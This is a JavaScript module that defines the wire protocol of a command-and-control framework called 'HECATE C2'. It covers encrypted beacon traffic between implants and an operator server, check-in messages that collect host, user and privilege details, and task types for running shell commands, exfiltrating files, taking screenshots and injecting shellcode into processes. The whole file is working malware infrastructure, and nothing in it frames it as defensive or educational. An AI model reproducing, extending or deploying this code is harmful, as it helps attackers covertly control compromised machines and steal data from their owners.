'use strict';

/**
 * HECATE C2 — Wire Protocol
 *
 * Transport: HTTPS POST /c2/beacon
 * Implant identity: X-Agent-ID header (UUID)
 *
 * Payload: AES-256-GCM encrypted JSON, base64-encoded body.
 * Each implant has a unique 32-byte key provisioned at build time.
 * The server stores keys encrypted with the global HECATE KeyManager key.
 *
 * Message types (implant → server):
 *   checkin  — initial registration or periodic heartbeat with sysinfo
 *   result   — task result(s) from previous checkin
 *
 * Message types (server → implant):
 *   tasklist — list of pending tasks (may be empty)
 *   die      — terminate implant
 *
 * Wire format (body):
 *   base64( IV[12] || GCM_TAG[16] || CIPHERTEXT )
 *
 * All timestamps: ISO 8601 UTC strings.
 */

const crypto = require('crypto');

const IV_BYTES  = 12;
const TAG_BYTES = 16;
const ALG       = 'aes-256-gcm';

// ── Crypto ────────────────────────────────────────────────────────────────────

/**
 * Encrypt a JSON-serialisable payload with a 32-byte implant key.
 * @param {object} payload
 * @param {Buffer} key         - 32-byte AES-256 key
 * @returns {string}           - base64-encoded wire blob
 */
function encrypt(payload, key) {
  const iv         = crypto.randomBytes(IV_BYTES);
  const cipher     = crypto.createCipheriv(ALG, key, iv);
  const plaintext  = Buffer.from(JSON.stringify(payload), 'utf8');
  const ciphertext = Buffer.concat([cipher.update(plaintext), cipher.final()]);
  const tag        = cipher.getAuthTag();
  return Buffer.concat([iv, tag, ciphertext]).toString('base64');
}

/**
 * Decrypt a wire blob with a 32-byte implant key.
 * @param {string} blob        - base64 string from request body
 * @param {Buffer} key         - 32-byte AES-256 key
 * @returns {object}           - parsed payload
 * @throws on decryption failure (wrong key, tampered)
 */
function decrypt(blob, key) {
  const buf        = Buffer.from(blob, 'base64');
  const iv         = buf.slice(0, IV_BYTES);
  const tag        = buf.slice(IV_BYTES, IV_BYTES + TAG_BYTES);
  const ciphertext = buf.slice(IV_BYTES + TAG_BYTES);
  const decipher   = crypto.createDecipheriv(ALG, key, iv);
  decipher.setAuthTag(tag);
  const plaintext = Buffer.concat([decipher.update(ciphertext), decipher.final()]);
  return JSON.parse(plaintext.toString('utf8'));
}

/**
 * Generate a new random 32-byte implant key.
 * @returns {Buffer}
 */
function generateKey() {
  return crypto.randomBytes(32);
}

// ── Message builders ──────────────────────────────────────────────────────────

/** Build a checkin message (implant → server) */
function buildCheckin(info, jitterSec = 30) {
  return {
    type: 'checkin',
    ts:   new Date().toISOString(),
    jitter: jitterSec,
    info: {
      os:        info.os       ?? 'unknown',
      hostname:  info.hostname ?? 'unknown',
      user:      info.user     ?? 'unknown',
      pid:       info.pid      ?? 0,
      arch:      info.arch     ?? 'unknown',
      integrity: info.integrity ?? 'medium',  // low | medium | high | system
      ip:        info.ip       ?? null,
    },
  };
}

/** Build a task result message (implant → server) */
function buildResult(results) {
  return {
    type:    'result',
    ts:      new Date().toISOString(),
    results: results.map(r => ({
      taskId:   r.taskId,
      output:   r.output   ?? '',
      exitCode: r.exitCode ?? 0,
      error:    r.error    ?? null,
      ts:       r.ts       ?? new Date().toISOString(),
    })),
  };
}

/** Build a tasklist response (server → implant) */
function buildTasklist(tasks, sleepSec = 30, jitterPct = 20) {
  return {
    type:      'tasklist',
    ts:        new Date().toISOString(),
    sleep:     sleepSec,
    jitter:    jitterPct,
    tasks:     tasks,
  };
}

/** Build a die command (server → implant) */
function buildDie(reason = 'operator') {
  return { type: 'die', ts: new Date().toISOString(), reason };
}

// ── Task type constants ───────────────────────────────────────────────────────

const TASK_TYPES = {
  SHELL:     'shell',       // execute shell command
  SYSINFO:   'sysinfo',    // collect system info
  UPLOAD:    'upload',     // implant → server (implant reads file, sends base64)
  DOWNLOAD:  'download',   // server → implant (server sends base64, implant writes)
  SLEEP:     'sleep',      // change beacon interval
  SCREENSHOT:'screenshot', // capture screen (stub — implant-specific)
  INJECT:    'inject',     // process injection target PID + shellcode (advanced)
  DIE:       'die',        // self-terminate
};

// ── Validation ────────────────────────────────────────────────────────────────

function validateCheckin(msg) {
  return msg?.type === 'checkin' && msg.info != null;
}

function validateResult(msg) {
  return msg?.type === 'result' && Array.isArray(msg.results);
}

module.exports = {
  encrypt, decrypt, generateKey,
  buildCheckin, buildResult, buildTasklist, buildDie,
  validateCheckin, validateResult,
  TASK_TYPES,
};
